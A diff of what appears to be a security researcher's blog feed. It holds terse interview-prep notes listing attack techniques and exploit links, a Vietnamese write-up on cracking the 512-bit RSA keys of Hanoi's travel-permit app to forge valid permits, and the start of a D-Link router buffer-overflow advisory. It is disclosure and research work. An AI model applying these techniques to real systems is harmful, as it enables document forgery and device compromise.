+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET /api/reset?token=$string$ HTTP/1.1&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host: localhost&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;arp posoining. dns cache cost, trade off, rang buoc physical / virtual (laptop, cuop may, shoulder sniffing)&lt;/p&gt;
+
+&lt;p&gt;wifi fake&lt;/p&gt;
+
+&lt;p&gt;bug in adapter,&lt;/p&gt;
+
+&lt;p&gt;microusb&lt;/p&gt;
+
+&lt;p&gt;physical first,&lt;/p&gt;
+
+&lt;p&gt;stand up fake wifi&lt;/p&gt;
+
+&lt;p&gt;rubbie duckie&lt;/p&gt;
+
+&lt;p&gt;social engineer&lt;/p&gt;
+
+&lt;p&gt;fake wifi - listening to serve dns request to sniff, spoof, poison - passthekey, responder, passthehash -&lt;/p&gt;
+
+&lt;p&gt;social engineer&lt;/p&gt;
+
+&lt;p&gt;for key, value in data.items(): for value&lt;/p&gt;
+
+&lt;p&gt;pre-clicked post-clicked&lt;/p&gt;
+
+&lt;p&gt;email content drive by content snapshot, shutdown, cut inbound/outbound trade off: offline -&amp;gt; loosing memory dump online → ransonware signature/heuristics - detect malware&lt;/p&gt;
+
+&lt;p&gt;process funding qualify escalation&lt;/p&gt;
+
+&lt;p&gt;problem issue? reasonable malicious intent wide-ly strategic&lt;/p&gt;
+
+&lt;p&gt;short term goal, long term goas&lt;/p&gt;
+
+&lt;p&gt;security question coding problem solving breakdown demo technical dialog interview ctf walkthrough&lt;/p&gt;
+
+&lt;p&gt;be detailed be ideally web app&lt;/p&gt;
+
+&lt;p&gt;academic approach&lt;/p&gt;
+
+&lt;p&gt;Coding questions: - Solving CEASAR: &lt;a href=&quot;https://www.tutorialspoint.com/cryptography_with_python/cryptography_with_python_caesar_cipher.htm&quot;&gt;https://www.tutorialspoint.com/cryptography_with_python/cryptography_with_python_caesar_cipher.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Find prime: &lt;a href=&quot;https://www.geeksforgeeks.org/python-program-to-check-whether-a-number-is-prime-or-not/&quot;&gt;https://www.geeksforgeeks.org/python-program-to-check-whether-a-number-is-prime-or-not/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Power of 2: &lt;a href=&quot;https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-1&quot;&gt;https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-1&lt;/a&gt; &lt;a href=&quot;https://www.geeksforgeeks.org/python-program-to-find-whether-a-no-is-power-of-two/&quot;&gt;https://www.geeksforgeeks.org/python-program-to-find-whether-a-no-is-power-of-two/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Python pickle: &lt;a href=&quot;https://intoli.com/blog/dangerous-pickles/&quot;&gt;https://intoli.com/blog/dangerous-pickles/&lt;/a&gt; &lt;a href=&quot;https://blog.nelhage.com/2011/03/exploiting-pickle/&quot;&gt;https://blog.nelhage.com/2011/03/exploiting-pickle/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- PHP dese: &lt;a href=&quot;https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-2&quot;&gt;https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-2&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Java deser: &lt;a href=&quot;https://medium.com/swlh/hacking-java-deserialization-7625c8450334&quot;&gt;https://medium.com/swlh/hacking-java-deserialization-7625c8450334&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Apache log parser import re&lt;/p&gt;
+
+&lt;p&gt;HOST = r’^(?P&lt;host&gt;.\*?)&apos; SPACE = r&apos;\\s&apos; IDENTITY = r&apos;\\S+&apos; USER = r&apos;\\S+&apos; TIME = r&apos;(?P&lt;time&gt;\\\[.\*?\\\])&apos; REQUEST = r&apos;\\&quot;(?P&lt;request&gt;.\*?)\\&quot;&apos; STATUS = r&apos;(?P&lt;status&gt;\\d{3})&apos; SIZE = r&apos;(?P&lt;size&gt;\\S+)&apos;&lt;/size&gt;&lt;/status&gt;&lt;/request&gt;&lt;/time&gt;&lt;/host&gt;&lt;/p&gt;
+
+&lt;p&gt;REGEX = HOST+SPACE+IDENTITY+SPACE+USER+SPACE+TIME+SPACE+REQUEST+SPACE+STATUS+SPACE+SIZE+SPACE&lt;/p&gt;
+
+&lt;p&gt;def parser(log_line): match = re.search(REGEX,log_line) return ( (match.group(‘host’), match.group(‘time’), match.group(‘request’) , match.group(‘status’) , match.group(‘size’) ) )&lt;/p&gt;
+
+&lt;p&gt;- IP count in log: &lt;a href=&quot;https://medium.com/devops-challenge/apache-log-parser-using-python-8080fbc41dda&quot;&gt;https://medium.com/devops-challenge/apache-log-parser-using-python-8080fbc41dda&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- PCAP log parser &lt;a href=&quot;https://stackoverflow.com/questions/46996649/how-do-i-parse-a-tcpdump-file-with-python&quot;&gt;https://stackoverflow.com/questions/46996649/how-do-i-parse-a-tcpdump-file-with-python&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- PORT Scan: &lt;a href=&quot;https://www.peerlyst.com/posts/python-3-tcp-ip-scanner-outputs-open-ports-guy-derenoncourt&quot;&gt;https://www.peerlyst.com/posts/python-3-tcp-ip-scanner-outputs-open-ports-guy-derenoncourt&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Nmap Parser: &lt;a href=&quot;https://xael.org/pages/python-nmap-en.html&quot;&gt;https://xael.org/pages/python-nmap-en.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- PDFs parser: &lt;a href=&quot;https://realpython.com/pdf-python/#how-to-extract-document-information-from-a-pdf-in-python&quot;&gt;https://realpython.com/pdf-python/#how-to-extract-document-information-from-a-pdf-in-python&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Packet parser: &lt;a href=&quot;https://stackoverflow.com/questions/20556139/how-do-i-parse-a-captured-packet-in-python&quot;&gt;https://stackoverflow.com/questions/20556139/how-do-i-parse-a-captured-packet-in-python&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Technical - Secure Image: &lt;a href=&quot;https://security.stackexchange.com/questions/222760/how-do-we-secure-image-parsing-libraries-against-buffer-overflow&quot;&gt;https://security.stackexchange.com/questions/222760/how-do-we-secure-image-parsing-libraries-against-buffer-overflow&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Same-origin_policy &lt;a href=&quot;https://www.netsparker.com/whitepaper-same-origin-policy/&quot;&gt;https://www.netsparker.com/whitepaper-same-origin-policy/&lt;/a&gt; &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- CORS vs CSP &lt;a href=&quot;https://devonblog.com/security/difference-between-cors-and-csp-security-headers/&quot;&gt;https://devonblog.com/security/difference-between-cors-and-csp-security-headers/&lt;/a&gt; &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Traceroute &lt;a href=&quot;https://www.slashroot.in/how-does-traceroute-work-and-examples-using-traceroute-command&quot;&gt;https://www.slashroot.in/how-does-traceroute-work-and-examples-using-traceroute-command&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Google SSO &lt;a href=&quot;https://www.quora.com/How-does-Google-single-sign-on-work&quot;&gt;https://www.quora.com/How-does-Google-single-sign-on-work&lt;/a&gt; &lt;a href=&quot;https://www.quora.com/How-does-Google-achieve-single-sign-on-between-different-domains-such-as-YouTube-and-Gmail&quot;&gt;https://www.quora.com/How-does-Google-achieve-single-sign-on-between-different-domains-such-as-YouTube-and-Gmail&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- XSS Auditor deprecated &lt;a href=&quot;https://portswigger.net/daily-swig/google-deprecates-xss-auditor-for-chrome&quot;&gt;https://portswigger.net/daily-swig/google-deprecates-xss-auditor-for-chrome&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- SSRF &lt;a href=&quot;https://unit42.paloaltonetworks.com/server-side-request-forgery-exposes-data-of-technology-industrial-and-media-organizations/&quot;&gt;https://unit42.paloaltonetworks.com/server-side-request-forgery-exposes-data-of-technology-industrial-and-media-organizations/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- SSRF Testing payload &lt;a href=&quot;https://github.com/cujanovic/SSRF-Testing&quot;&gt;https://github.com/cujanovic/SSRF-Testing&lt;/a&gt; fnsakfnsalkgnaslkg&lt;/p&gt;
+
+&lt;p&gt;- XSS Prevention alphanumeric http header &lt;a href=&quot;https://www.acunetix.com/websitesecurity/xss/&quot;&gt;https://www.acunetix.com/websitesecurity/xss/&lt;/a&gt; &lt;a href=&quot;https://security.stackexchange.com/questions/86561/is-csp-enough-to-prevent-xss-attacks&quot;&gt;https://security.stackexchange.com/questions/86561/is-csp-enough-to-prevent-xss-attacks&lt;/a&gt; &lt;a href=&quot;https://security.stackexchange.com/questions/19524/current-best-practices-to-prevent-persistent-xss-attacks&quot;&gt;https://security.stackexchange.com/questions/19524/current-best-practices-to-prevent-persistent-xss-attacks&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;-CSRF &lt;a href=&quot;https://www.acunetix.com/websitesecurity/csrf-attacks/&quot;&gt;https://www.acunetix.com/websitesecurity/csrf-attacks/&lt;/a&gt; &lt;a href=&quot;https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md&quot;&gt;https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- XXE &lt;a href=&quot;https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/&quot;&gt;https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- SQLi: &lt;a href=&quot;https://portswigger.net/web-security/sql-injection&quot;&gt;https://portswigger.net/web-security/sql-injection&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;- Access Control &lt;a href=&quot;https://portswigger.net/web-security/access-control&quot;&gt;https://portswigger.net/web-security/access-control&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;hr /&gt;
+
+&lt;hr /&gt;
+
+&lt;hr /&gt;
+
+&lt;hr /&gt;</content><author><name>Chi Tran</name></author><category term="hackthebox" /><summary type="html">Given network scan results</summary></entry><entry><title type="html">[Tiếng Việt] Tôi đã fake hơn 250k giấy đi đường như thế nào — “Weak Key Cryptography in real world”</title><link href="http://localhost:4000/security-research/2021/09/17/weak-rsa-in-realworld-vietnamese.html" rel="alternate" type="text/html" title="[Tiếng Việt] Tôi đã fake hơn 250k giấy đi đường như thế nào — “Weak Key Cryptography in real world”" /><published>2021-09-17T00:00:00-05:00</published><updated>2021-09-17T00:00:00-05:00</updated><id>http://localhost:4000/security-research/2021/09/17/weak-rsa-in-realworld-vietnamese</id><content type="html" xml:base="http://localhost:4000/security-research/2021/09/17/weak-rsa-in-realworld-vietnamese.html">&lt;h3 id=&quot;i-tóm-tắt&quot;&gt;I. TÓM TẮT&lt;/h3&gt;
+
+&lt;p&gt;Hệ thống cấp giấy đi đường mà Công An Thành Phố Hà Nội đang sử dụng tồn tại lỗ hổng nghiêm trọng về cách triển khai mã hóa, dẫn đến nguy cơ bị giả mạo giấy đi đường tùy ý hay cũng có khả năng rất cao (không phải tuyệt đối) tạo điều kiện cho Fx đi muôn nơi.&lt;/p&gt;
+
+&lt;h3 id=&quot;ii-phân-tích&quot;&gt;II. PHÂN TÍCH&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;1.&lt;/strong&gt; &lt;strong&gt;DỮ LIỆU QR&lt;/strong&gt; Thông qua báo chí và mạng xã hội, anh em chúng tôi tìm được một bản mẫu của mã QR giấy đi đường như hình dưới đây:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1.jpg&quot; alt=&quot;&quot; /&gt; Trích xuất tại: &lt;a href=&quot;https://thanhtra.com.vn/xa-hoi/doi-song/ghi-nhan-trong-ngay-dau-ha-noi-thuc-hien-gian-cach-xa-hoi-phan-vung-187326.html&quot;&gt;https://thanhtra.com.vn/xa-hoi/doi-song/ghi-nhan-trong-ngay-dau-ha-noi-thuc-hien-gian-cach-xa-hoi-phan-vung-187326.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Qua khảo sát ứng dụng này, mặc dù đã che chắn rất kỹ thông tin nhưng mã QR lại không bị che, sau khi decode ta có được những thông tin trong mã QR như sau:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;**D9LOgcTFAS1MeC3kD4J+5PmAW5C4mOrPcbwbynsY6GEuGNkpe/dwIM5cr0MS/a+LT1y9z+8sKJA9UaPZTmYJwQ==&lt;/td&gt;
+      &lt;td&gt;**10505&lt;/td&gt;
+      &lt;td&gt;3&lt;/td&gt;
+      &lt;td&gt;06/09;07/09;08/09;09/09;10/09;11/09;12/09;13/09;14/09;15/09;16/09;17/09;18/09;19/09;20/09&lt;/td&gt;
+      &lt;td&gt;4_PHÒNG CẢNH SÁT GIAO THÔNG&lt;/td&gt;
+      &lt;td&gt;02439424451&lt;/td&gt;
+      &lt;td&gt;29G1–391.89&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Vùng 1&lt;/td&gt;
+      &lt;td&gt;Nguyễn Ánh Ngọc&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;09:00–20:00&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Trong cụm thông tin đã được decoded bao gồm các thông tin về người dân, cũng như mã phường của đơn vị cấp (ví dụ: &lt;strong&gt;10505&lt;/strong&gt;). Ở phía đầu của mỗi mã QR đều có một chuỗi chữ ký điện tử, sử dụng thuật toán RSA — SHA256 để ký.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2.&lt;/strong&gt; &lt;strong&gt;PHƯƠNG THỨC XÁC THỰC&lt;/strong&gt; Không khó lắm để tìm được ứng dụng xác thực mã đi đường trên Google Play Store. Tuy nhiên, do bị hạn chế quốc gia, nên cần phải VPN về Việt Nam để tải ứng dụng “&lt;strong&gt;Kiểm soát đi đường&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;&lt;em&gt;Link tải về (đã bị gỡ bỏ)&lt;/em&gt;&lt;/strong&gt;: &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.qrca&quot;&gt;https://play.google.com/store/apps/details?id=com.qrca&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Trước khi đi vào phân tích luồng hoạt động của ứng dụng thì chúng mình nói sơ qua chút về cách hoạt động của mô hình xác thực này.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mô hình hoạt động này thuộc dạng server-less, nghĩa là không cần dùng bất cứ Server nào trong suốt quá trình vận hành, hoạt động của app. Như vậy có một ưu điểm có thể nhìn ra ngay, đó là không sợ hệ thống bị quá tải, không sợ bị dân tình chửi nếu server sập ( ͡° ͜ʖ ͡°). Tuy nhiên việc đặt niềm tin 100% vào client chưa bao giờ đem lại kết quả tốt cả! Việc không xác thực lại ở phía server như vậy, có nghĩa là chỉ cần có Private Key của một phường, hoặc là cán bộ của Phường này tham nhũng, sẽ có thể cấp bừa bãi giấy đi đường cho bất cứ ai. Trong thời đại này niềm tin giữa con người với con người nó mong manh lắm.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3.&lt;/strong&gt; &lt;strong&gt;LUỒNG HOẠT ĐỘNG CỦA ỨNG DỤNG&lt;/strong&gt; Dữ liệu ban đầu được scan qua mã QR là:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;**D9LOgcTFAS1MeC3kD4J+5PmAW5C4mOrPcbwbynsY6GEuGNkpe/dwIM5cr0MS/a+LT1y9z+8sKJA9UaPZTmYJwQ==&lt;/td&gt;
+      &lt;td&gt;**10505&lt;/td&gt;
+      &lt;td&gt;3&lt;/td&gt;
+      &lt;td&gt;06/09;07/09;08/09;09/09;10/09;11/09;12/09;13/09;14/09;15/09;16/09;17/09;18/09;19/09;20/09&lt;/td&gt;
+      &lt;td&gt;4_PHÒNG CẢNH SÁT GIAO THÔNG&lt;/td&gt;
+      &lt;td&gt;02439424451&lt;/td&gt;
+      &lt;td&gt;29G1–391.89&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Vùng 1&lt;/td&gt;
+      &lt;td&gt;Nguyễn Ánh Ngọc&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;09:00–20:00&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Trong đó, “&lt;strong&gt;10505&lt;/strong&gt;” là mã của đơn vị cấp, ở đây là “&lt;strong&gt;Phòng cảnh sát giao thông&lt;/strong&gt;”. Sau khi nhận được dữ liệu từ mã QR, chương trình sẽ lấy dữ liệu tiếp tục từ mã phường trở về cuối, sau đó sẽ thực hiện các bước kế tiếp theo thứ tự như sau:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;Thực hiện xóa bỏ tất cả các ký tự “&lt;/td&gt;
+          &lt;td&gt;”,&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Xóa bỏ các ký tự đặc biệt&lt;/li&gt;
+  &lt;li&gt;Bỏ dấu tiếng Việt&lt;/li&gt;
+  &lt;li&gt;Chuyển các ký tự về dạng chữ cái thường&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Code xử lý input string&lt;/p&gt;
+
+&lt;p&gt;Dữ liệu khi đó trở thành:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;10505&lt;/strong&gt;3060907090809090910091109120913091409150916091709180919092009&lt;strong&gt;4_phongcanhsatgiaothong&lt;/strong&gt;02439424451&lt;strong&gt;29g139189&lt;/strong&gt;vung1&lt;strong&gt;nguyenanhngoc&lt;/strong&gt;09002000&lt;/p&gt;
+
+&lt;p&gt;Tiếp tục, dữ liệu được chuyển sang một dạng hash code mà &lt;strong&gt;lachongtech&lt;/strong&gt; tự phát triển, thuật toán hoạt động đơn giản như sau:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Hashcode&lt;/strong&gt; = 0
+Count = 0
+For char in String:
+Count += 1
+&lt;strong&gt;Hashcode&lt;/strong&gt; += char * Count
+&lt;strong&gt;Hashcode&lt;/strong&gt; = (1988 * &lt;strong&gt;Hashcode&lt;/strong&gt; — 1910) / 2&lt;/p&gt;
+
+&lt;p&gt;Qua bước hashcode, dữ liệu có được dạng như sau: “&lt;strong&gt;682673275&lt;/strong&gt;”&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Đây chính là điểm yếu đầu tiên của cách triển khai, việc tính ra Hashcode quá đơn giản, dẫn đến trường hợp Collision có thể xảy ra, nghĩa là có thể một chuỗi có nội dung hoàn toàn khác cũng có trùng hashcode.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dữ liệu sau khi qua bước Hashcode được đưa vào kiểm tra xác thực chữ ký bằng khóa công khai trong ứng dụng. Tuy nhiên, sau khi kiểm tra, có thể thấy ứng dụng đang sử dụng RSA public key với chiều dài key là 512 bits. Ở thời điểm hiện tại, chiều dài key 512 bits là rất yếu, hoàn toàn có thể bị crack trong vài tiếng. Về lý thuyết thì ai cũng biết key 512-bits có thể bị crack, nhưng crack bằng cách nào thì ít thấy chỗ nào đề cập đến (cũng có thể bọn mình tìm chưa kỹ) qua Google search. Các kết quả tìm kiếm đa phần đều là các CTF challenges. Search trên factordb cũng ra, và đương nhiên là trong trường hợp này, factordb không có kết quả của key mình đang tìm. Trong tất cả kết quả tìm kiếm thì chỉ duy nhất có một paper là đáng chú ý:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Reference: &lt;a href=&quot;https://seclab.upenn.edu/projects/faas/faas.pdf&quot;&gt;https://seclab.upenn.edu/projects/faas/faas.pdf&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Đại khái là thay vì sử dụng một máy để crack key, tác giả đã tận dụng sức mạnh của cloud để crack 1 key 512bits trong vòng thời gian vài giờ đồng hồ, giải pháp này gần như là khả thi để crack mọi key có độ dài 512 bits. Và cũng rất may, tác giả cũng có public repo bao gồm tất cả các công cụ cần thiết để “ăn liền” luôn.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Link: &lt;a href=&quot;https://github.com/eniac/faas&quot;&gt;https://github.com/eniac/faas&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Mặc dù mang tiếng là ăn liền nhưng trên thực tế, quá trình setup mấy cái công cụ này cũng khá là đau đầu, bởi nó sử dụng các công nghệ từ năm 2015 để chạy, nhưng tới giờ là 2021 rồi, các công nghệ đó đều đã cũ, những công cụ đó không còn được support, hoặc là đã thay đổi rất nhiều từ đó tới giờ. Mấy anh em đã phải mất tới 2 ngày để nghiên cứu và sửa lại cho nó chạy được, và cũng may mắn thay, tới phút cuối mọi thứ vẫn chạy mượt mà như ý muốn.&lt;/p&gt;
+
+&lt;h3 id=&quot;iii-state-of-the-art&quot;&gt;III. STATE OF THE ART&lt;/h3&gt;
+
+&lt;p&gt;Phần đau đầu và hấp dẫn nhất có lẽ không phải là ở những lỗi nêu trên mà là setup môi trường để crack.&lt;/p&gt;
+
+&lt;h3 id=&quot;1-cài-đặt-môi-trường&quot;&gt;1. Cài đặt môi trường&lt;/h3&gt;
+
+&lt;p&gt;- Như bọn mình đã đề cập ở trên, công nghệ crack này được tạo ra từ 2015 bởi 1 nhóm các giáo sư và kỹ sư đến từ University of Pennsylvania. Một công cụ gần 7 năm tuổi về cơ bản không còn tương thích với các phiên bản hiện đại hơn ngày nay. Vì vậy, việc setup và chạy thử đã tốn khá nhiều thời gian. Phần lớn thời gian dành cho việc debug lỗi trong quá trình setup, tìm kiếm phiên bản thư viện và dependencies tương thích. Và sau gần 2 ngày hì hục cùng với chút kinh nghiệm ít ỏi của một đứa con địa chủ AWS VPS thì bọn mình đã chạy thử thành công với một đoạn RSA với độ dài 100 chars.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/6.jpg&quot; alt=&quot;&quot; /&gt; Quá trình spin-up EC2 instances&lt;/p&gt;
+
+&lt;h3 id=&quot;2-cracking-the-real-key&quot;&gt;2. Cracking the real key&lt;/h3&gt;
+
+&lt;p&gt;Các public keys được cung cấp bởi ứng dụng “Kiểm soát đi đường” đều có độ dài 155 ký tự tương ứng với RSA 512-bits. Vì vậy, thời gian crack và số lượng instances cũng tăng lên. Bọn mình triển khai tổng cộng 16 instances EC2 x 36 CPUs x 60 GiB Memory cho mỗi key cần crack. Sau khi script được run, việc của mấy anh em mình là ngồi đợi và hy vọng sẽ không có FATAL errors gì. Cuối cùng, sau gần 9 tiếng đồng hồ, bọn mình đã thu được kết quả.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;3-chi-phí-triển-khai&quot;&gt;3. Chi phí triển khai&lt;/h3&gt;
+
+&lt;p&gt;Vì mình là con ruột của địa chủ, cho nên các chi phí đối với mình không đáng kể. Tuy nhiên, mình cũng sẽ show cho các bạn xem chi tiết số tiền các bạn phải bỏ ra để crack RSA-512 bits trong vòng 9 tiếng (+ test crack) là khoảng $250 USD cho 2 keys (per region)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/8-scaled.jpg&quot; alt=&quot;&quot; /&gt; Bọn mình sau đó đã tìm cách để optimize quá trình này bằng cách sử dụng lại các sieves cho các key khác nhưng không thành công. Liên hệ với tác giả của công cụ này, cách tốt nhất có lẽ là lưu lại trong database. Nhưng vì lý do thời gian, bọn mình đã không thực hiện theo cách này.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;4-sử-dụng-private-key&quot;&gt;4. Sử dụng Private Key&lt;/h3&gt;
+
+&lt;p&gt;Sau khi sử dụng một số công cụ hỗ trợ, việc crack đã thành công và khôi phục được Private Key ban đầu. Sử dụng Private Key này tương ứng với khu vực phường Láng Hạ, có thể sinh ra được các chữ ký hợp lệ cho giấy đi đường mà phần mềm không hề phát hiện ra sai sót gì. Ngoài ra, do ứng dụng không hề check phường có khớp với khóa công khai hay không, nên có thể sử dụng một khóa duy nhất để giả mạo giấy đi đường cho toàn Hà Nội mà không bị phát hiện.&lt;/p&gt;
+
+&lt;h3 id=&quot;iv-demo&quot;&gt;IV. DEMO&lt;/h3&gt;
+
+&lt;h3&gt;&lt;img src=&quot;images/10.png&quot; alt=&quot;&quot; /&gt;&lt;/h3&gt;
+
+&lt;p&gt;Tạo QR Code&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Chi Tran</name></author><category term="security-research" /><summary type="html">I. TÓM TẮT</summary></entry><entry><title type="html">[ZDI-21-977] D-Link DAP-2020 webproc Stack-based BOF RCE</title><link href="http://localhost:4000/security-research/2021/08/21/zdi-21-977-d-link-dap-2020-webproc-stack-based-bof-rce.html" rel="alternate" type="text/html" title="[ZDI-21-977] D-Link DAP-2020 webproc Stack-based BOF RCE" /><published>2021-08-21T00:00:00-05:00</published><updated>2021-08-21T00:00:00-05:00</updated><id>http://localhost:4000/security-research/2021/08/21/zdi-21-977-d-link-dap-2020-webproc-stack-based-bof-rce</id><content type="html" xml:base="http://localhost:4000/security-research/2021/08/21/zdi-21-977-d-link-dap-2020-webproc-stack-based-bof-rce.html">&lt;h3 id=&quot;i-overview&quot;&gt;&lt;em&gt;&lt;strong&gt;I. OVERVIEW&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Discoverer: Chi Tran &amp;amp; phieulang93 &amp;amp; chung96vn&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Vendor &amp;amp; Product: D-Link&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Version: DAP-2020 A1&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Zero Day Initiative: &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-21-977/&quot;&gt;ZDI-21-977&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CVE Reference: &lt;a href=&quot;https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201&quot;&gt;CVE-2021-34861&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;ii-vulnerability-details&quot;&gt;&lt;em&gt;&lt;strong&gt;II. VULNERABILITY DETAILS&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of D-Link DAP-2020 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the webproc endpoint, which listens on TCP port 80 by default. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;After analyzing the DAP-2020 A1 Router, a Stack Buffer-overflow vulnerability was discovered on &lt;em&gt;&lt;strong&gt;mini_httpd&lt;/strong&gt;&lt;/em&gt; service via post data, which exist in &lt;strong&gt;&lt;em&gt;main()&lt;/em&gt;&lt;/strong&gt; function in &lt;em&gt;&lt;strong&gt;/usr/www/cgi-bin/webproc&lt;/strong&gt;&lt;/em&gt; binary.&lt;/li&gt;
